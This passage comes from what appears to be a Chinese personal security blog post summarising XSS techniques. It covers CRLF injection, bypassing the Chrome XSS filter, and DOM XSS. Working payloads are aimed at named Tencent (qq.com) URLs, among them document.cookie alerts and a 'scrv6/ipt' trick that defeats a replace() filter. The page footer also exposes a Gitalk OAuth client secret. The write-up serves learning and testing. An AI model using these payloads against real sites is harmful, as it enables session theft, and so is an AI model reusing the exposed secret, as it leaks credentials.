+<h1 id="换行符复仇记"><a href="#换行符复仇记" class="headerlink" title="换行符复仇记"></a>换行符复仇记</h1><p>输入 payload  查看xss代码出现在源码的哪些地方，若是出现在多处地方可以使用crlf方法进行绕过限制（一处地方被转义，另一处地方可能不被转义）</p>
+<h1 id="XSS-过滤器绕过-通用绕过"><a href="#XSS-过滤器绕过-通用绕过" class="headerlink" title="XSS 过滤器绕过 [通用绕过]"></a>XSS 过滤器绕过 [通用绕过]</h1><p>触发xss时，payload 可能会被 浏览器中的 xss filter 拦截 。Chrome的拦截器就很强大</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17z5bp2agj20pw0h5qfp.jpg" alt></p>
+<p>危害部分被和谐了。</p>
+<ol>
+<li><p>那么怎么绕过呢？ 这里直接说方法。</p>
+</li>
+<li><p>首先要求缺陷点，允许 &lt; , &gt; 。其次，要求缺陷点的后方存在<code>&lt;/script&gt;</code>标签。 我们看看当前的这个点的代码。</p>
+</li>
+</ol>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;input type=<span class="string">"hidden"</span> id=<span class="string">"sClientUin"</span> value=<span class="string">""</span>&gt;<span class="xml"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">1</span> <span class="attr">onerror</span>=<span class="string">alert(1)</span>&gt;</span>"&gt;</span></span><br><span class="line"><span class="xml"></span></span><br><span class="line"><span class="xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span> <span class="attr">src</span>=<span class="string">"http://pingjs.qq.com/tcss.ping.js"</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure>
+
+<p>构造如下payload</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=data:,alert(<span class="number">1</span>)&lt;!-</span><br><span class="line">http:<span class="comment">//bangbang.qq.com/php/login?game=roco&amp;uin="&gt;&lt;script src=data:,alert(1)&lt;!--&amp;world=5&amp;roleid=44583443&amp;level=8&amp;role=%2</span></span><br></pre></td></tr></table></figure>
+
+<h1 id="XSS-过滤器绕过-猥琐绕过"><a href="#XSS-过滤器绕过-猥琐绕过" class="headerlink" title="XSS 过滤器绕过 [猥琐绕过]"></a>XSS 过滤器绕过 [猥琐绕过]</h1><p>有些时候，通用的绕过技巧并不可行，这个时候我们就得观察缺陷点的周围环境，想想其它办法咯。“猥琐绕过”与通用绕过不<br>同的是，它通用性小，往往只是特例</p>
+<p><strong>一个dom xss 绕过过滤器的实例</strong></p>
+<ol>
+<li>直接看实例点：<br> <code>http://qzs.qq.com/qzone/v6/custom/custom_module_proxy.html#siDomain=1&amp;g_StyleID=aaaaaaaaaa</code></li>
+</ol>
+<ol start="2">
+<li><p>可以看出，这是一个 DOM XSS 的点。</p>
+</li>
+<li><p>我们看看源码。</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> siDomain = paras[<span class="string">'siDomain'</span>],</span><br><span class="line">g_StyleID = paras[<span class="string">'g_StyleID'</span>].replace(<span class="string">"v6/"</span>,<span class="string">""</span>);</span><br><span class="line"><span class="keyword">if</span>(siDomain.indexOf(<span class="string">".qq.com"</span>)&gt;<span class="number">-1</span>)&#123;<span class="comment">//防止 qzs.qq.com</span></span><br><span class="line">siDomain = paras[<span class="string">'siDomain'</span>] = <span class="string">"qzonestyle.gtimg.cn"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">document</span>.write(<span class="string">'&lt;link href="http://'</span>+siDomain+<span class="string">'/qzone_v6/gb/skin/'</span>+g_StyleID+<span class="string">'.css" rel="stylesheet" /&gt;&lt;link</span></span><br><span class="line"><span class="string">href="http://'</span>+siDomain+<span class="string">'/qzone_v6/home_normal.css" rel="stylesheet" /&gt;'</span>);</span><br></pre></td></tr></table></figure>
+
+<p>不难看出，siDomain 与 g_StyleID 都是地址栏里获取过来，然后通过 document.write 输出到页面中。</p>
+</li>
+<li><p>利用先前教程的知识，我们不难构造出利用代码。<br> <code>http://qzs.qq.com/qzone/v6/custom/custom_module_proxy.html#siDomain=1&amp;g_StyleID=&quot;&gt;&lt;script&gt;alert(document.cookie)
+ &lt;/script&gt;</code><br> 可以看到，<strong>IE 下成功弹出</strong>。</p>
+</li>
+</ol>
+<p>但是到了 chrome 下，又被拦截</p>
+<p>这个时候怎么办呢？ 因为这里接受地址栏的参数时，是以 &quot;=&quot; 分割，因而我们的代码中是不允许携带 等号的。故上一篇的技巧不<br>能拿到这里来使用了！</p>
+<p>chrome 拦截，是有一定的拦截规则的，只有它觉得是恶意代码的才会去拦截。这个时候，就需要我们“观察地形”啦！！<br>我们仔细看看这句。</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">g_StyleID = paras['g_StyleID'].replace("v6/","");	#这里会对 g_StyleID 进行一次替换，将 v6/替换为空。</span><br></pre></td></tr></table></figure>
+
+<p>我们的 g_StyleID 写为下面的情况<br><code>&lt;scrv6/ipt&gt;alert(document.cookie)&lt;/script&gt;</code><br>经过替换后，就会变成。</p>
+<p><code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code></p>
+<p>但是 chrome 并不会把<code>&lt;scrv6/ipt&gt;alert(document.cookie)&lt;/script&gt;</code> 当作恶意的，是不是就可以绕过了？<br>我们试试。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://qzs.qq.com/qzone/v6/custom/custom_module_proxy.html#siDomain=1&amp;g_StyleID=&quot;&gt;&lt;scv6/ript&gt;alert(document.cook</span><br><span class="line">ie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+
+<p>果然可以～</p>
+<h1 id="DOM-xss"><a href="#DOM-xss" class="headerlink" title="DOM xss"></a>DOM xss</h1><p>前面的教程，说到了显式输出和隐式输出。但是不论怎么样，因为最终 javascript 都会通过 document.write 或 innerHTML 将内<br>容输出到网页中，所以我们总是有办法看到输出到哪里。 但是有时候，我们的输出，最终并没有流向 innerHTML 或 document.write，<br>而是与 eval 发生了邂逅，我们该怎么挖掘并利用呢？</p>
+<p>详细说明：</p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17zk9ygnqj20o50ho44l.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17zkgxjjej20ns0j0gwz.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17zm8s357j20jx0hr3zb.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17zmj3fbgj20kh0id0ye.jpg" alt></p>
+<p><img src="https://raw.githubusercontent.com/Wh0ale/Image-Hosting/master/blog/b6de3d7dly1g17zms133fj20jh0i241s.jpg" alt></p>
+
+    </div>
+
+    
+    
+    
+
+    <div>
+    
+    <div>
+    
+        <div style="text-align:center;color: #ccc;font-size:14px;">-------------本文结束<i class="fa fa-paw"></i>感谢您的阅读-------------</div>
+    
+</div>
+
+    
+    </div>
+      <div>
+        
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>Wh0ale</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    <a href="https://wh0ale.github.io/2019/03/19/2019-3-19-那些年我们一起学XSS/" title="那些年我们一起学XSS 总结">https://wh0ale.github.io/2019/03/19/2019-3-19-那些年我们一起学XSS/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+
+    <footer class="post-footer">
+          
+        
+        <div class="post-tags">
+            <a href="/tags/xss/" rel="tag"><i class="fa fa-tag"></i># xss</a>
+          
+        </div>
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+              <a href="/2019/03/14/2019-3-14-java代码审计/" rel="next" title="java代码审计">
+                <i class="fa fa-chevron-left"></i> java代码审计
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+              <a href="/2019/03/20/2019-3-20-XSS Cheat sheet/" rel="prev" title="XSS Cheat sheet">
+                XSS Cheat sheet <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+    
+    <div class="comments" id="gitalk-container"></div>
+  
+
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image"
+      src="/images/avatar.gif"
+      alt="Wh0ale">
+  <p class="site-author-name" itemprop="name">Wh0ale</p>
+  <div class="site-description motion-element" itemprop="description">No master and rookie，only hardworking and lazy.</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">123</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-tags">
+        
+          
+            <a href="/tags/">
+          
+        
+        
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+          
+        
+        <span class="site-state-item-count">59</span>
+        <span class="site-state-item-name">标签</span>
+        </a>
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://github.com/Wh0ale" title="GitHub &rarr; https://github.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-github"></i>GitHub</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://medium.com/@Wh0ale" title="Medium &rarr; https://medium.com/@Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-medium"></i>Medium</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="/AttackerWh0ale@gmail.com" title="Mail &rarr; AttackerWh0ale@gmail.com"><i class="fa fa-fw fa-envelope"></i>Mail</a>
+      </span>
+    
+      <span class="links-of-author-item">
+      
+      
+        
+      
+      
+        
+      
+        <a href="https://twitter.com/Wh0ale" title="Twitter &rarr; https://twitter.com/Wh0ale" rel="noopener" target="_blank"><i class="fa fa-fw fa-twitter"></i>Twitter</a>
+      </span>
+    
+  </div>
+  <div class="cc-license motion-element" itemprop="license">
+    
+  
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/zh-Hans" class="cc-opacity" rel="noopener" target="_blank"><img src="/images/cc-by-nc-sa.svg" alt="Creative Commons"></a>
+  </div>
+
+
+
+        </div>
+      </div>
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#什么都没过滤的入门情况"><span class="nav-number">1.</span> <span class="nav-text">什么都没过滤的入门情况</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#输出在-lt-script-gt-lt-script-gt-之间的情况"><span class="nav-number">2.</span> <span class="nav-text">输出在&lt;script&gt;&lt;/script&gt;之间的情况</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#输出在-HTML-属性里的情况"><span class="nav-number">3.</span> <span class="nav-text">输出在 HTML 属性里的情况</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#input标签"><span class="nav-number">3.1.</span> <span class="nav-text">input标签</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#body标签"><span class="nav-number">3.2.</span> <span class="nav-text">body标签</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#src-href-action-xlink-href-autofocus-content-data-等属性"><span class="nav-number">3.3.</span> <span class="nav-text">src/href/action/xlink:href/autofocus/content/data 等属性</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#on-事件"><span class="nav-number">3.4.</span> <span class="nav-text">on 事件</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#宽字节复仇记"><span class="nav-number">4.</span> <span class="nav-text">宽字节复仇记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#反斜线复仇记"><span class="nav-number">5.</span> <span class="nav-text">反斜线复仇记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#换行符复仇记"><span class="nav-number">6.</span> <span class="nav-text">换行符复仇记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-过滤器绕过-通用绕过"><span class="nav-number">7.</span> <span class="nav-text">XSS 过滤器绕过 [通用绕过]</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS-过滤器绕过-猥琐绕过"><span class="nav-number">8.</span> <span class="nav-text">XSS 过滤器绕过 [猥琐绕过]</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#DOM-xss"><span class="nav-number">9.</span> <span class="nav-text">DOM xss</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+        <div class="back-to-top motion-element">
+          <i class="fa fa-arrow-up"></i>
+          
+            <span id="scrollpercent"><span>0</span>%</span>
+          
+        </div>
+      
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2019</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Wh0ale</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">1.4m</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">21:52</span>
+</div>
+
+<div>
+<span id="timeDate">载入天数...</span><span id="times">载入时分秒...</span>
+<script>
+    var now = new Date();
+    function createtime() {
+        var grt= new Date("03/31/2019 00:00:00");
+        now.setTime(now.getTime()+250);
+        days = (now - grt ) / 1000 / 60 / 60 / 24; dnum = Math.floor(days);
+        hours = (now - grt ) / 1000 / 60 / 60 - (24 * dnum); hnum = Math.floor(hours);
+        if(String(hnum).length ==1 ){hnum = "0" + hnum;} minutes = (now - grt ) / 1000 /60 - (24 * 60 * dnum) - (60 * hnum);
+        mnum = Math.floor(minutes); if(String(mnum).length ==1 ){mnum = "0" + mnum;}
+        seconds = (now - grt ) / 1000 - (24 * 60 * 60 * dnum) - (60 * 60 * hnum) - (60 * mnum);
+        snum = Math.round(seconds); if(String(snum).length ==1 ){snum = "0" + snum;}
+        document.getElementById("timeDate").innerHTML = "本站已安全运行 "+dnum+" 天 ";
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒";
+    }
+setInterval("createtime()",250);
+</script>
+</div>
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-user"></i>
+    </span>
+    <span class="site-uv" title="总访客量">
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+    </span>
+  
+    <span class="post-meta-divider">|</span>
+  
+    <span class="post-meta-item-icon">
+      <i class="fa fa-eye"></i>
+    </span>
+    <span class="site-pv" title="总访问量">
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+    </span>
+  
+</div>
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+  </div>
+
+  
+    
+    
+  
+  <script color='0,0,255' opacity='0.5' zIndex='-1' count='99' src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+  <script src="/lib/fancybox/source/jquery.fancybox.pack.js"></script>
+  <script src="/lib/reading_progress/reading_progress.js"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  <script src="/js/utils.js?v=7.3.0"></script>
+  <script src="/js/motion.js?v=7.3.0"></script>
+
+  
+  <script src="/js/affix.js?v=7.3.0"></script>
+  <script src="/js/schemes/pisces.js?v=7.3.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.3.0"></script>
+<script src="/js/post-details.js?v=7.3.0"></script>
+
+
+
+  <script src="/js/next-boot.js?v=7.3.0"></script>
+
+  
+
+  
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.3.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '925b9aa350afc793e04c',
+    clientSecret: 'bcd92ef416b81450a12e6388b00dfa49f798437a',
+    repo: 'Wh0ale.github.io',
+    owner: 'Wh0ale',
+    admin: ['Wh0ale'],
+    id: md5(location.pathname),
+      language: window.navigator.language || window.navigator.userLanguage,
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+
+</body>
+</html>
